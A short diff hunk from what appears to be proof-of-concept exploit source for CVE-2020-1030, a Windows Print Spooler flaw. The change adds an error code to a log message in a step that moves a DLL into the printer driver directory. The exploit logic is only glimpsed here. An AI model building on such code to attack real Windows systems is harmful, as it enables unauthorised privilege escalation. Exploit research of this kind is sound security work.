@@ -50,7 +50,7 @@ void cve_2020_1030(wchar_t* printerName, wchar_t* filePath, bool isRestarted) {
 
 		// move the file passed as parameter inside the newFilePath inside the cve_2020_1030.dll 
 		if (!MoveFile(filePath, newFilePath)) {
-			cout << "[-] Error while copying the DLL inside v4 directory" << endl;
+			cout << "[-] Error while copying the DLL inside v4 directory, error: " << GetLastError() << endl;
 			return;
 		}
 		cout << "[+] DLL correctly copied inside v4 directory" << endl;
